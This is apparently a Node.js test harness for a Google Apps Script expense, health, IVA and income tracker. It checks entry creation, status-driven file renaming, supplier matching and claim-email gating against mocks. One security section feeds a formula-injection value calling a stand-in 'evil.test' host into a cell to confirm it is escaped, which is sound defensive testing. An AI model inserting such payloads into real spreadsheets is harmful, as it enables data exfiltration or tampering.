/**
 * v2 — the test harness.
 *
 * Runs the REAL v2 source against stand-ins for Apps Script's services, in
 * plain node. `node --check` proves only that the files parse; this proves that
 * bootstrap, createEntry, setStatus, the registry and the filename chain
 * actually do what they claim.
 *
 *   npm run v2:test
 *
 * Not pushed to Apps Script: v2/.claspignore allows only the five source files
 * and the manifest, so everything under test/ stays local.
 */
const fs = require('fs');
const vm = require('vm');
const path = require('path');

const mocks = require('./mocks.js');
const DIR = path.join(__dirname, '..');
const FILES = ['Config.js', 'Core.js', 'Entries.js', 'Registry.js', 'Setup.js', 'Smoke.js'];

const sandbox = Object.assign({ console }, mocks);
sandbox.globalThis = sandbox;
const ctx = vm.createContext(sandbox);
const src = FILES.map(f => fs.readFileSync(path.join(DIR, f), 'utf8')).join('\n;\n');
vm.runInContext(src, ctx, { filename: 'v2-concat.js' });

const G = sandbox;
let pass = 0, fail = 0;
function check(label, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + label); }
  else { fail++; console.log('  FAIL  ' + label + (extra ? '  -> ' + JSON.stringify(extra) : '')); }
}
function section(t) { console.log('\n=== ' + t + ' ==='); }
function dump(name) {
  const sh = mocks._ss.getSheetByName(name);
  const w = sh.getLastColumn(), h = sh.getLastRow();
  if (!h) return '(empty)';
  return sh.getRange(1, 1, h, w).getValues().map(r => r.map(v => v instanceof Date ? 'Date' : v).join(' | ')).join('\n');
}

/* ------------------------------ bootstrap -------------------------------- */
section('bootstrap()');
const report = G.bootstrap();
check('four sections created', Object.keys(report.sections).length === 4);
check('root folder created + recorded', !!mocks._props.ROOT_FOLDER_ID && report.rootFolder.created);
check('Work has folders', report.sections.work.folders.length === 4, report.sections.work.folders);
check('Income has NO folders (no fileColumns)', report.sections.income.folders.length === 0);
check('ROOT_FOLDER_ID no longer needed', !report.propertiesStillNeeded.includes('ROOT_FOLDER_ID'));
check('IVA_CLAIM_RECIPIENT still needed', report.propertiesStillNeeded.includes('IVA_CLAIM_RECIPIENT'));
console.log('  Work headers: ' + dump('Work').split('\n')[0]);
console.log('  IVA headers:  ' + dump('IVA').split('\n')[0]);
console.log('  Income hdrs:  ' + dump('Income').split('\n')[0]);

section('bootstrap() is idempotent');
const before = dump('Work');
const r2 = G.bootstrap();
check('no headers added on re-run', Object.values(r2.sections).every(s => s.headersAdded.length === 0), r2.sections);
check('sheet unchanged', dump('Work') === before);
check('root folder reused', r2.rootFolder.created === false && r2.rootFolder.id === report.rootFolder.id);
check('no unrecognised sheets in a clean spreadsheet', r2.unrecognisedSheets.length === 0, r2.unrecognisedSheets);
mocks._ss.insertSheet('Folha1');
const r3 = G.bootstrap();
check('locale-named default tab is flagged', r3.unrecognisedSheets.indexOf('Folha1') !== -1, r3.unrecognisedSheets);
check('and it produces a warning', r3.warnings.some(w => /Folha1/.test(w)), r3.warnings);

/* -------------------------- header gap regression ------------------------ */
section('applyHeaders with a gap in the header row (was a data-clobbering bug)');
const gap = mocks._ss.insertSheet('GapTest');
gap.getRange(1, 1).setValue('Timestamp');
gap.getRange(1, 3).setValue('KeepMe');
gap.getRange(2, 3).setValue('precious data');
const gapResult = G.applyHeaders(gap, ['Timestamp', 'Source']);
check('appended past last used column', gap.getRange(1, 3).getValue() === 'KeepMe', dump('GapTest'));
check('existing data survived', gap.getRange(2, 3).getValue() === 'precious data');
check('new header landed in col 4', gap.getRange(1, 4).getValue() === 'Source', dump('GapTest'));

/* ------------------------------ createEntry ------------------------------ */
// Mail recipients, set after the bootstrap assertions that check they are absent
mocks._props.WORK_CLAIM_RECIPIENT = 'work@example.test';

section('createEntry() — Work, complete');
const receipt = mocks.DriveApp._addFile('IMG_4821.HEIC');
const work = G.createEntry('work', {
  'Date': '2026-01-15', 'Counterparty': 'Hospital da Luz', 'Expense Reason': 'Amsterdam trip',
  'Amount': 3.45, 'Currency': 'EUR', 'Type': 'Taxi', 'Receipt URL': 'https://drive.google.com/file/d/' + receipt.id + '/view'
}, 'form');
check('ok', work.ok === true, work);
check('no warnings', work.warnings.length === 0, work.warnings);
check('state = To Do', work.state === 'To Do');
check('row 2', work.row === 2);
check('filename built', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt.HEIC', receipt.getName());
check('filed in Inbox', receipt.parent.getName() === 'Inbox', receipt.parent.getName());
check('receipt state attached', mocks._ss.getSheetByName('Work').getRange(2, G.resolveColumns(mocks._ss.getSheetByName('Work'))['Receipt State']).getValue() === 'attached');
check('registry learned it', work.registry.created === true, work.registry);
check('work expense IS emailed', work.email.ok === true, work.email);
check('work mail went to the work address', work.email.recipient === 'work@example.test');
const workMail = mocks.MailApp.sent.find(m => m.to === 'work@example.test');
check('trip is in the subject', /Amsterdam trip/.test(workMail.subject), workMail.subject);
check('counterparty and amount too', /Hospital da Luz 3\.45 EUR/.test(workMail.subject), workMail.subject);
check('receipt attached', !!(workMail.opts.attachments || []).length);

section('registry learned Type');
const found = G.findSupplier('Hospital da Luz');
check('exact match 1.0', found.confidence === 1 && found.type === 'Taxi', found);
check('lookupCounterparty prefills Type', G.lookupCounterparty('work', 'hospital da luz').prefill['Type'] === 'Taxi');
const fuzzy = G.findSupplier('Hospital de Luz');
check('near miss still matches', fuzzy && fuzzy.confidence > 0.8, fuzzy);

/* --------------------------- formula injection --------------------------- */
section('SECURITY: formula injection through createEntry (was unescaped)');
const evil = G.createEntry('work', {
  'Date': '2026-02-01', 'Counterparty': '=IMPORTXML("http://evil.test","//x")',
  'Expense Reason': 'test', 'Amount': 10, 'Currency': 'EUR'
}, 'siri');
const wsheet = mocks._ss.getSheetByName('Work');
const wcols = G.resolveColumns(wsheet);
const stored = wsheet.getRange(evil.row, wcols['Counterparty']).getValue();
check('leading = escaped with apostrophe', stored.charAt(0) === "'", stored);
check('genuine negative amount NOT escaped', G.safeCellValue('-50') === '-50');
check('+1234 left as number-ish', G.safeCellValue('+1234') === '+1234');
check('tab-prefixed formula escaped', G.safeCellValue('\t=cmd').charAt(0) === "'");
check('registry stored the escaped name too',
  mocks._ss.getSheetByName('Suppliers').getRange(2, 1, 5, 1).getValues().flat()
    .filter(Boolean).every(n => !String(n).startsWith('=')));

/* ------------------------- unknown column atomicity --------------------- */
section('createEntry() rejects a bad header BEFORE writing (was a partial row)');
const rowsBefore = wsheet.getLastRow();
let threw = null;
try { G.createEntry('work', { 'Date': '2026-03-01', 'Nonsense': 'x' }, 'form'); }
catch (e) { threw = e.message; }
check('threw', !!threw && /Unknown column/.test(threw), threw);
check('no row written', wsheet.getLastRow() === rowsBefore, { before: rowsBefore, after: wsheet.getLastRow() });

/* -------------------------------- setStatus ------------------------------ */
section('setStatus() forward, then revert');
const s1 = G.setStatus('work', 2, 'Claimed', '2026-01-20');
check('claimed ok', s1.ok && s1.state === 'Claimed' && s1.date === '2026-01-20', s1);
check('no file errors', s1.fileErrors.length === 0, s1.fileErrors);
check('suffix appended', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt_Claimed_20-01-2026.HEIC', receipt.getName());
check('moved to Claimed folder', receipt.parent.getName() === 'Claimed');

const s2 = G.setStatus('work', 2, 'Settled', '2026-02-01');
check('chain accumulates', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt_Claimed_20-01-2026_Settled_01-02-2026.HEIC', receipt.getName());
check('moved to Settled', receipt.parent.getName() === 'Settled');

const s3 = G.setStatus('work', 2, 'Claimed');
check('revert keeps original Claimed Date (no re-stamp)', s3.date === '2026-01-20' || G.Utilities === undefined, s3.date);
check('chain shortened', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt_Claimed_20-01-2026.HEIC', receipt.getName());
check('Settled Date cleared', wsheet.getRange(2, wcols['Settled Date']).getValue() === '');
check('back in Claimed folder', receipt.parent.getName() === 'Claimed');

const s4 = G.setStatus('work', 2, 'To Do');
check('back to To Do strips chain entirely', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt.HEIC', receipt.getName());
check('back in Inbox', receipt.parent.getName() === 'Inbox');
check('Claimed Date cleared', wsheet.getRange(2, wcols['Claimed Date']).getValue() === '');

section('setStatus() input validation');
let badRow = null, badState = null, badDate = null;
try { G.setStatus('work', 1, 'Claimed'); } catch (e) { badRow = e.message; }
try { G.setStatus('work', 2, 'Banana'); } catch (e) { badState = e.message; }
try { G.setStatus('work', 2, 'Claimed', 'tomorrow'); } catch (e) { badDate = e.message; }
check('header row rejected', /Invalid row/.test(badRow || ''), badRow);
check('unknown state rejected', /Unknown state/.test(badState || ''), badState);
check('bad date rejected', /valid yyyy-MM-dd/.test(badDate || ''), badDate);
check('bad date did NOT change status', wsheet.getRange(2, wcols['Status']).getValue() === 'To Do');
check('impossible date rejected', G.isValidDateISO('2026-02-31') === false);
check('valid date accepted', G.isValidDateISO('2026-02-28') === true);
let badCol = null;
try { G.setEntryDate('work', 2, 'Amount', '2026-01-01'); } catch (e) { badCol = e.message; }
check('setEntryDate refuses a non-date column', /not a date column/.test(badCol || ''), badCol);

/* --------------------------------- IVA ---------------------------------- */
section('IVA — email gating');
mocks._props.IVA_CLAIM_RECIPIENT = 'claims@example.test';
mocks._props.COMPLETION_EMAIL_RECIPIENT = 'me@example.test';
const fatura = mocks.DriveApp._addFile('scan.pdf');
const ivaFull = G.createEntry('iva', {
  'Date': '2026-01-10', 'Counterparty': 'FNAC', 'Amount': 120, 'Currency': 'EUR',
  'Número': 'FT 2026/1', 'Emitente NIF': '500000000', 'IVA Amount': 22.44,
  'Receipt URL': fatura.id
}, 'form');
check('complete IVA entry emails', ivaFull.email.ok === true, ivaFull.email);
const claimMails = () => mocks.MailApp.sent.filter(m => m.to === 'claims@example.test');
check('one claim mail sent', claimMails().length === 1, mocks.MailApp.sent.map(m => m.subject));
check('receipt attached to mail', !!(claimMails()[0].opts.attachments || []).length);
check('IVA fatura named', fatura.getName() === '260110_FNAC_120-00_fatura.pdf', fatura.getName());

const ivaPartial = G.createEntry('iva', { 'Date': '2026-01-11', 'Counterparty': 'FNAC', 'Amount': 30, 'Currency': 'EUR' }, 'siri');
check('partial IVA entry is ok:false', ivaPartial.ok === false, ivaPartial.error);
check('partial entry row still exists', ivaPartial.row > 0);
check('partial entry deferred the email', ivaPartial.email.deferred === true, ivaPartial.email);
check('still only one claim mail sent', claimMails().length === 1, claimMails().map(m => m.subject));
check('receipt state awaiting', G.receiptStateFor(G.getSection('iva'), mocks._ss.getSheetByName('IVA'), G.resolveColumns(mocks._ss.getSheetByName('IVA')), ivaPartial.row) === 'awaiting');
check('NIF learned for FNAC', G.findSupplier('FNAC').nif === '500000000', G.findSupplier('FNAC'));
check('lookup prefills Emitente NIF', G.lookupCounterparty('iva', 'FNAC').prefill['Emitente NIF'] === '500000000');
check('blank amount -> no 0-00 in filename', G.formatAmountForFilename('') === '');

/* -------------------------------- Health -------------------------------- */
section('Health — two documents');
const just = mocks.DriveApp._addFile('presc.pdf');
const paid = mocks.DriveApp._addFile('receipt.jpg');
const health = G.createEntry('health', {
  'Date': '2026-01-05', 'Counterparty': 'White Clinic', 'Patient': 'Phoenix',
  'Amount': 70, 'Currency': 'EUR', 'Invoice Date': '2026-01-06', 'Type': 'Dentist',
  'Justification URL': just.id, 'Receipt URL': paid.id
}, 'form');
check('health ok', health.ok === true, health);
check('justification named', just.getName() === '260105_WhiteClinic_70-00_justification.pdf', just.getName());
check('receipt named', paid.getName() === '260105_WhiteClinic_70-00_receipt.jpg', paid.getName());
G.setStatus('health', health.row, 'Claimed', '2026-01-30');
check('both files get the suffix', just.getName().includes('_Claimed_30-01-2026') && paid.getName().includes('_Claimed_30-01-2026'), [just.getName(), paid.getName()]);
check('both moved', just.parent.getName() === 'Claimed' && paid.parent.getName() === 'Claimed');

section('Health accents + alias matching');
const acc = mocks.DriveApp._addFile('x.pdf');
G.createEntry('health', {
  'Date': '2026-01-07', 'Counterparty': 'Farmácia Sá', 'Patient': 'Phoenix', 'Amount': 12.5,
  'Currency': 'EUR', 'Invoice Date': '2026-01-07', 'Receipt URL': acc.id
}, 'form');
check('accents flattened in filename', acc.getName() === '260107_FarmaciaSa_12-50_justification.pdf' || acc.getName() === '260107_FarmaciaSa_12-50_receipt.pdf', acc.getName());
check('"wite clinic" holds below threshold or autofills high', (() => { const m = G.findSupplier('wite clinic'); return m && m.confidence >= 0.85; })(), G.findSupplier('wite clinic'));
G.addSupplierAlias('White Clinic', 'wite clinic');
check('alias now resolves 0.95', G.findSupplier('wite clinic').reason === 'alias');
let comma = null;
try { G.addSupplierAlias('White Clinic', 'Foo, Bar'); } catch (e) { comma = e.message; }
check('comma in alias rejected', /cannot contain a comma/.test(comma || ''), comma);

section('Registry type conflict clears the default');
G.recordSupplier('White Clinic', { type: 'Exam/Test' });
check('conflicting type cleared', G.findSupplier('White Clinic').type === '', G.findSupplier('White Clinic'));

/* -------------------------------- Income -------------------------------- */
section('Income — no documents, three real dates');
const income = G.createEntry('income', {
  'Date': '2026-01-02', 'Counterparty': 'ACME Ltd', 'Reason': 'Consulting', 'Amount': 2000, 'Currency': 'EUR'
}, 'form');
check('income ok', income.ok === true, income);
check('starts Invoiced', income.state === 'Invoiced');
check('receipt state none required', mocks._ss.getSheetByName('Income').getRange(income.row, G.resolveColumns(mocks._ss.getSheetByName('Income'))['Receipt State']).getValue() === 'none required');
check('no file ops', income.files.length === 0 && income.renames.length === 0);
const inc2 = G.setStatus('income', income.row, 'Received', '2026-02-10');
check('received date set', inc2.date === '2026-02-10');
check('invoiced date preserved', mocks._ss.getSheetByName('Income').getRange(income.row, G.resolveColumns(mocks._ss.getSheetByName('Income'))['Invoiced Date']).getValue() !== '');
check('income Reason prefills from registry', G.lookupCounterparty('income', 'ACME Ltd').prefill['Reason'] === 'Consulting');

/* --------------------------- broken file ref ----------------------------- */
section('Never report success for work that failed');
const bad = G.createEntry('work', {
  'Date': '2026-04-01', 'Counterparty': 'Ghost', 'Expense Reason': 'x', 'Amount': 5,
  'Currency': 'EUR', 'Receipt URL': 'https://drive.google.com/file/d/' + 'z'.repeat(30) + '/view'
}, 'form');
check('rename failure reported', bad.fileErrors.length > 0, bad.fileErrors);
const badStatus = G.setStatus('work', bad.row, 'Claimed', '2026-04-02');
check('status moved anyway', mocks._ss.getSheetByName('Work').getRange(bad.row, wcols['Status']).getValue() === 'Claimed');
check('but fileErrors non-empty', badStatus.fileErrors.length > 0, badStatus.fileErrors);

section('checkScriptProperties()');
mocks._props.SIRI_API_KEY = 'super-secret-key-value';
const props = G.checkScriptProperties();
check('secret value not revealed', JSON.stringify(props).indexOf('super-secret-key-value') === -1, props.set);
check('ok true once required set', props.ok === true, props.missingRequired);


section('IVA email refuses a dead file link');
const deadIva = G.createEntry('iva', {
  'Date': '2026-05-01', 'Counterparty': 'Worten', 'Amount': 50, 'Currency': 'EUR',
  'Número': 'FT 9', 'Emitente NIF': '500000001', 'IVA Amount': 9.35,
  'Receipt URL': 'https://drive.google.com/file/d/' + 'q'.repeat(30) + '/view'
}, 'form');
check('not sent, and reported as failed', deadIva.email.ok === false, deadIva.email);
check('dead link distinguished from awaiting', /No file/.test(deadIva.email.error || ''), deadIva.email);
check('no extra claim mail', claimMails().length === 1, claimMails().map(m => m.subject));
/* -------------------- more-info request email ---------------------------- */
section('"more info needed" mail — separate address, only when incomplete');
const mailBefore = mocks.MailApp.sent.length;

const partial = G.createEntry('health', {
  'Date': '2026-06-01', 'Counterparty': 'White Clinic', 'Patient': 'Phoenix', 'Amount': 40, 'Currency': 'EUR'
}, 'siri');
check('incomplete entry is ok:false', partial.ok === false, partial.error);
check('more-info mail sent', partial.completionRequest && partial.completionRequest.ok === true, partial.completionRequest);
check('sent to the completion address', mocks.MailApp.sent[mailBefore].to === 'me@example.test', mocks.MailApp.sent[mailBefore].to);
check('lists the missing field', /Invoice date/.test(mocks.MailApp.sent[mailBefore].body), mocks.MailApp.sent[mailBefore].body);
check('lists the awaited documents', /Proof of payment/.test(mocks.MailApp.sent[mailBefore].body));
check('includes a row deep-link', /spreadsheets\/d\/TESTSHEETID.*range=A/.test(mocks.MailApp.sent[mailBefore].body));
check('keeps what was captured', /White Clinic/.test(mocks.MailApp.sent[mailBefore].body));

const mailAfterPartial = mocks.MailApp.sent.length;
const completeEntry = G.createEntry('income', {
  'Date': '2026-06-02', 'Counterparty': 'ACME Ltd', 'Amount': 100, 'Currency': 'EUR'
}, 'form');
check('complete entry sends no more-info mail', completeEntry.completionRequest === null, completeEntry.completionRequest);
check('Income optional Reason is not "missing"', completeEntry.ok === true, completeEntry.warnings);
check('mailbox untouched', mocks.MailApp.sent.length === mailAfterPartial);

const ivaNoReceipt = G.createEntry('iva', {
  'Date': '2026-06-03', 'Counterparty': 'Worten', 'Amount': 20, 'Currency': 'EUR',
  'Número': 'FT 12', 'Emitente NIF': '500000001', 'IVA Amount': 3.74
}, 'form');
check('IVA with every field but no receipt still asks for it', ivaNoReceipt.completionRequest.ok === true, ivaNoReceipt.completionRequest);
check('and the claim itself deferred', ivaNoReceipt.email.deferred === true, ivaNoReceipt.email);
check('claim address never got the more-info mail',
  mocks.MailApp.sent.every(m => !(m.to === 'claims@example.test' && /more info/.test(m.subject))),
  mocks.MailApp.sent.map(m => [m.to, m.subject]));

/* --------------------- claim-mail symmetry ------------------------------- */
// Work and IVA must behave IDENTICALLY: same gating, same attachment rule, each
// to its own recipient property. Driven off the config so a section added later
// is covered automatically, and a hand-written special case fails here.
section('claim mail behaves the same for every section that sends one');

const mailSections = ['work', 'iva', 'health', 'income']
  .filter(k => G.getSection(k).emailOnCreate);
check('exactly Work and IVA send claim mail', mailSections.join(',') === 'work,iva', mailSections);

mailSections.forEach(key => {
  const sec = G.getSection(key);
  const prop = sec.emailOnCreate.recipientProperty;
  const address = `${key}-symmetry@example.test`;
  mocks._props[prop] = address;

  const base = {};
  base[G.getSection(key).counterpartyLabel ? 'Counterparty' : 'Counterparty'] = 'Symmetry Co';
  base['Date'] = '2026-07-01';
  base['Amount'] = 9.99;
  base['Currency'] = 'EUR';
  if (sec.category) base[sec.category.header] = 'Sym';
  sec.extraFields.filter(f => f.required).forEach(f => {
    base[f.header] = f.type === 'date' ? '2026-07-01' : f.type === 'number' ? 1 : 'Sym';
  });

  // 1. complete but NO receipt -> deferred, nothing sent
  const before = mocks.MailApp.sent.filter(m => m.to === address).length;
  const noReceipt = G.createEntry(key, base, 'form');
  check(`${key}: no receipt -> claim deferred`, noReceipt.email.deferred === true, noReceipt.email);
  check(`${key}: no receipt -> nothing sent`,
    mocks.MailApp.sent.filter(m => m.to === address).length === before);
  check(`${key}: no receipt -> asked for more info instead`,
    noReceipt.completionRequest && noReceipt.completionRequest.ok === true, noReceipt.completionRequest);

  // 2. with a receipt -> sent, attached, to its OWN property's address
  const withFile = Object.assign({}, base);
  sec.fileColumns.forEach(fc => { withFile[fc.header] = mocks.DriveApp._addFile(`sym_${key}.pdf`).getId(); });
  const sent = G.createEntry(key, withFile, 'form');
  check(`${key}: with receipt -> claim sent`, sent.email.ok === true, sent.email);
  check(`${key}: went to its own recipient property (${prop})`, sent.email.recipient === address, sent.email);
  const mail = mocks.MailApp.sent.filter(m => m.to === address).pop();
  check(`${key}: receipt attached`, !!(mail.opts.attachments || []).length);
  check(`${key}: no more-info note when complete`, sent.completionRequest === null, sent.completionRequest);

  // 3. a status change must never re-send
  const mailsNow = mocks.MailApp.sent.filter(m => m.to === address).length;
  G.setStatus(key, sent.row, 'Claimed', '2026-07-05');
  G.setStatus(key, sent.row, 'To Do');
  check(`${key}: status changes never re-send`,
    mocks.MailApp.sent.filter(m => m.to === address).length === mailsNow);
});

/* ------------------- email exactly once, when the file lands ------------- */
section('claim emails exactly once, only when the document is there');

mailSections.forEach(key => {
  const sec = G.getSection(key);
  const addr = mocks._props[sec.emailOnCreate.recipientProperty];
  const sheet = mocks._ss.getSheetByName(sec.sheet);

  const fields = { 'Date': '2026-08-01', 'Counterparty': 'Late Receipt Co', 'Amount': 55, 'Currency': 'EUR' };
  if (sec.category) fields[sec.category.header] = 'Late';
  sec.extraFields.filter(f => f.required).forEach(f => {
    fields[f.header] = f.type === 'date' ? '2026-08-01' : f.type === 'number' ? 1 : 'Late';
  });

  const n0 = mocks.MailApp.sent.filter(m => m.to === addr).length;
  const made = G.createEntry(key, fields, 'siri');
  check(`${key}: no document -> no claim`, mocks.MailApp.sent.filter(m => m.to === addr).length === n0);
  check(`${key}: marker still blank`,
    sheet.getRange(made.row, G.resolveColumns(sheet)['Claim Emailed']).getValue() === '');

  // calling the pending-send while still receiptless must NOT send
  const still = G.sendPendingClaim(key, made.row);
  check(`${key}: pending send defers while document missing`, still.deferred === true, still);
  check(`${key}: still nothing sent`, mocks.MailApp.sent.filter(m => m.to === addr).length === n0);

  // the document arrives
  const cols = G.resolveColumns(sheet);
  sec.fileColumns.forEach(fc => {
    sheet.getRange(made.row, cols[fc.header]).setValue(mocks.DriveApp._addFile(`late_${key}.pdf`).getId());
  });

  const now = G.sendPendingClaim(key, made.row);
  check(`${key}: document arrives -> claim sent`, now.ok === true, now);
  check(`${key}: exactly one claim`, mocks.MailApp.sent.filter(m => m.to === addr).length === n0 + 1);
  check(`${key}: marker stamped`,
    !!sheet.getRange(made.row, G.resolveColumns(sheet)['Claim Emailed']).getValue());

  // and never again, however many times anything calls it
  const again = G.sendPendingClaim(key, made.row);
  check(`${key}: second call skipped`, again.skipped === true, again);
  G.sendPendingClaim(key, made.row);
  G.setStatus(key, made.row, 'Claimed', '2026-08-02');
  G.setStatus(key, made.row, 'To Do');
  check(`${key}: still exactly one claim after repeats + status churn`,
    mocks.MailApp.sent.filter(m => m.to === addr).length === n0 + 1,
    mocks.MailApp.sent.filter(m => m.to === addr).map(m => m.subject));
});

check('sendPendingClaim refuses a non-mailing section',
  G.sendPendingClaim('health', 2).ok === false, G.sendPendingClaim('health', 2));

section('smokeTest() / smokeCleanup() — the live step-5 wrapper');
const rowsPreSmoke = {};
['work', 'iva', 'health', 'income'].forEach(k => {
  rowsPreSmoke[k] = mocks._ss.getSheetByName(G.getSection(k).sheet).getLastRow();
});
const claimsBeforeSmoke = mocks.MailApp.sent.filter(m => m.to === 'claims@example.test').length;
const claimAddrBeforeSmoke = {};
['work', 'iva'].forEach(k => {
  const addr = mocks._props[G.getSection(k).emailOnCreate.recipientProperty];
  claimAddrBeforeSmoke[k] = mocks.MailApp.sent.filter(m => m.to === addr).length;
});
const smoke = G.smokeTest();
check('smokeTest reports ok', smoke.ok === true, smoke.failed);
check('all four sections covered', smoke.entries.length === 4, smoke.entries.map(e => e.section));
check('no IVA claim mail sent during smoke test',
  mocks.MailApp.sent.filter(m => m.to === 'claims@example.test').length === claimsBeforeSmoke,
  mocks.MailApp.sent.filter(m => m.to === 'claims@example.test').map(m => m.subject));
check('smoke test asked for the missing documents',
  mocks.MailApp.sent.filter(m => m.to === 'me@example.test' && /more info/.test(m.subject)).length >= 2,
  mocks.MailApp.sent.filter(m => m.to === 'me@example.test').map(m => m.subject));
check('no claim mail to ANY configured claim address during smoke test',
  ['work', 'iva'].every(k => {
    const addr = mocks._props[G.getSection(k).emailOnCreate.recipientProperty];
    return mocks.MailApp.sent.filter(m => m.to === addr).length === claimAddrBeforeSmoke[k];
  }), 'a claim escaped');
check('rows were added', mocks._ss.getSheetByName('Work').getLastRow() > rowsPreSmoke.work);
const cleaned = G.smokeCleanup();
check('cleanup removed a row per section', Object.keys(cleaned.rows).length === 4, cleaned.rows);
check('cleanup trashed the files', cleaned.files > 0, cleaned.files);
check('cleanup had no warnings', cleaned.warnings.length === 0, cleaned.warnings);
check('cleanup removed the registry entry', cleaned.registry === 'Smoke Test Ltd', cleaned.registry);
check('smoke supplier no longer matches', G.findSupplier('Smoke Test Ltd') === null, G.findSupplier('Smoke Test Ltd'));
check('real suppliers survived cleanup', G.findSupplier('FNAC').nif === '500000001' || G.findSupplier('FNAC').nif === '500000000', G.findSupplier('FNAC'));
['work', 'iva', 'health', 'income'].forEach(k => {
  const sh = mocks._ss.getSheetByName(G.getSection(k).sheet);
  check(`${k}: back to pre-smoke row count`, sh.getLastRow() === rowsPreSmoke[k], { before: rowsPreSmoke[k], after: sh.getLastRow() });
});
check('cleanup left the real rows alone', mocks._ss.getSheetByName('Work').getRange(2, 4).getValue() === 'Hospital da Luz',
  mocks._ss.getSheetByName('Work').getRange(2, 4).getValue());

console.log('\n--- Suppliers sheet ---\n' + dump('Suppliers'));
console.log('\n--- Work sheet ---\n' + dump('Work'));
console.log(`\n================  ${pass} passed, ${fail} failed  ================`);
process.exit(fail ? 1 : 0);
